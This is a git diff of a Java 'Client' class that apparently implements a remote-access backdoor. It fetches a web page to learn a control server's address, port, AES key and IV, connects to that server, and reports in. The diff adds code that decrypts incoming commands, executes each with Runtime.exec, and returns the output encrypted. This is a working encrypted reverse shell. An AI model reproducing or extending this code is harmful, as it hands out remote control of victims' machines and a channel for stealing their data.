@@ -1,15 +1,14 @@
 package com.revsn.client;
 
-import java.io.DataInput;
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
+import java.io.BufferedReader;
+import java.io.EOFException;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 
 import java.net.Socket;
 import java.net.URL;
-import java.nio.charset.StandardCharsets;
 
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
@@ -21,18 +20,20 @@ import java.util.UUID;
 import javax.crypto.*;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
-import javax.xml.crypto.Data;
 
-import org.apache.commons.codec.binary.Base64InputStream;
-import org.apache.commons.codec.binary.Base64OutputStream;
 import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
 
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
 public class Client {
+    protected static final Logger parentLogger = LogManager.getLogger();
+    private Logger LOG = parentLogger;
+
     private UUID uniqueID;
     private Socket reqSock;
-    private CipherInputStream ciIn;
-    private Base64OutputStream ciOut;
+    private String[] address = new String[2];
 
     private ObjectOutputStream dataOut;
     private ObjectInputStream dataIn;
@@ -40,13 +41,10 @@ public class Client {
     private Cipher cipherEnc;
     private Cipher cipherDec;
 
-    private String[] address = new String[2];
 
     private SecretKey key;
-
     private IvParameterSpec iv;
 
-    private boolean initDone = false;
     private boolean trigCheck = false;
     private boolean connExists = false;
 
@@ -58,35 +56,26 @@ public class Client {
     private boolean init() {
         if(!connExists) {
             try {
-                System.out.println("INIT");
-                initDone = true;
+                LOG.error("INIT");
 
                 int port = Integer.parseInt(address[1]);
                 
-                System.out.print(address[0] + " ");
-                System.out.println(address[1]);
+                LOG.error(address[0] + " ");
+                LOG.error(address[1]);
 
                 reqSock = new Socket(address[0], port);
 
-
-                System.out.println("INIT2");
                 dataOut = new ObjectOutputStream(reqSock.getOutputStream());
                 dataOut.flush();
-                System.out.println("INIT3");
-                //dataIn = new ObjectInputStream(reqSock.getInputStream());
-                System.out.println("INIT4");
-                //ciOut = new Base64OutputStream(new CipherOutputStream(reqSock.getOutputStream(), cipherEnc));
-                //ciOut.flush();
-                //ciIn = new CipherInputStream(new Base64InputStream(reqSock.getInputStream()), cipherDec);
+                dataIn = new ObjectInputStream(reqSock.getInputStream());
 
                 sendMessage(uniqueID + ": just arrived to vacation!");
                 connExists = true;
 
                 return true;
             } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
-                System.out.println("catch in init");
+                LOG.error("catch in init");
                 e.printStackTrace();
-                initDone = false;
                 return false;
             }
 
@@ -98,8 +87,7 @@ public class Client {
     private void close() {
         try {
             connExists = false;
-            //ciIn.close();
-            //ciOut.close();
+            trigCheck = false;
             dataIn.close();
             dataOut.close();
             
@@ -118,13 +106,13 @@ public class Client {
             Document doc = Jsoup.parse(url, 1000 * 3);
             String text = doc.body().text();
 
-            System.out.println(text);
+            LOG.error(text);
 
             String outp[] = text.split(";");
 
             address[0] = outp[0];
             address[1] = outp[1];
-            System.out.println(address[0]);
+            LOG.error(address[0]);
 
             byte[] decodedKey = Base64.getDecoder().decode(outp[2]);
             byte[] decodedIv = Base64.getDecoder().decode(outp[3]);
@@ -132,11 +120,11 @@ public class Client {
             this.key = new SecretKeySpec(decodedKey, "AES");
             this.iv = new IvParameterSpec(decodedIv);
 
-            System.out.println("CheckTrigTrue");
+            LOG.error("CheckTrigTrue");
             trigCheck = true;
             return true;
         } catch (IOException e) {
-            System.out.println("catch in checktrig");
+            LOG.error("catch in checktrig");
             trigCheck = false;
             return false;
         }
@@ -154,48 +142,80 @@ public class Client {
 
     private void sendMessage(String msg) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchPaddingException {
         try {
-            System.out.println("Send message :" + msg);
+            LOG.error("Send message :" + msg);
+
             cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
-        
             cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);
+
             String encoded = new String(Base64.getEncoder()
                 .encode(cipherEnc.doFinal(msg.getBytes())));
 
-            System.out.println(encoded);
-            dataOut.writeObject(encoded);
-            //ciOut.write(msg.getBytes(StandardCharsets.UTF_8));
+            LOG.debug(encoded);
 
+            dataOut.writeObject(encoded);
             dataOut.flush();
 
-            //ciOut.flush();
             
         } catch (IOException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException e) {
             e.printStackTrace();
         }
     }
 
-    public void handleMessage(byte[] msg) {
+    public void handleMessage(String msg) {
+        String answer = "";
 
         try {
             cipherDec = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipherDec.init(Cipher.DECRYPT_MODE, this.key, this.iv);
             
-            String message = ciIn.toString();
+            String message  = new String(cipherDec.doFinal(Base64.getDecoder()
+                .decode(msg)));
 
-            if (message.charAt(0) == '1') {
+            System.out.println(message);
+
+            if (message == "exit") {
                 sendMessage(uniqueID + ": said goobye, sadly.");
                 close();
+            } else {
+
+                BufferedReader stdInput = null;
+                BufferedReader stdError = null;
+                try {
+                    Runtime rt = Runtime.getRuntime();
+                    Process proc = rt.exec(message);
+
+                    stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+
+                    stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+                    try {
+                        String s = null;
+                        while ((s = stdInput.readLine()) != null) {
+                            answer += s;
+                            answer += "\n";
+                        }
+                        // Read any errors from the attempted command
+                        while ((s = stdError.readLine()) != null) {
+                            answer += s;
+                            answer += "\n";
+                        }
+                        sendMessage(answer);
+                        stdInput.close();
+                        stdError.close();
+            
+                    } catch (IOException e) {
+                        sendMessage("Failed to execute: " + message);
+                    } 
+                } catch (IllegalArgumentException | IOException e) {
+                    if(e instanceof IllegalArgumentException) {
+                        sendMessage("Do not send empty commands!");
+                    } else if(e instanceof IOException) {
+                        sendMessage("Failed to read BufIO");
+                    }
+                }
             }
-
-            if (message.charAt(0) == '9' && message.charAt(1) == '9' && message.charAt(2) == '9') {
-                updateStuff();
-            }
-
-            //TODO: Implement message handling, like send files etc
-
-
-        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException e) {
-            e.printStackTrace();
+        
+        } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException | BadPaddingException e) {
+            LOG.error("lul");
         }
             
     }
@@ -212,7 +232,7 @@ public class Client {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        System.out.println("Passed checktrig");
+        LOG.error("Passed checktrig");
         if (!init()) {
             try {
                 Thread.sleep(10000);
@@ -224,12 +244,19 @@ public class Client {
 
         while (!reqSock.isClosed()) {
             try {
-                //handleMessage(ciIn.readAllBytes());
+                String message = (String) dataIn.readObject();
+                handleMessage(message);
                 Thread.sleep(10000);
-                sendMessage("Wuddap");
-            } catch(InterruptedException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
-                e.printStackTrace();
-            }
+            } catch(InterruptedException | IOException | ClassNotFoundException e) {
+                if(e instanceof EOFException) {
+                    try {
+                        sendMessage("Connection gets reset because EOF Exception on Client");
+                        close();
+                    } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e1) {
+                        close();
+                    }
+                }
+            } 
         }
     }
 }
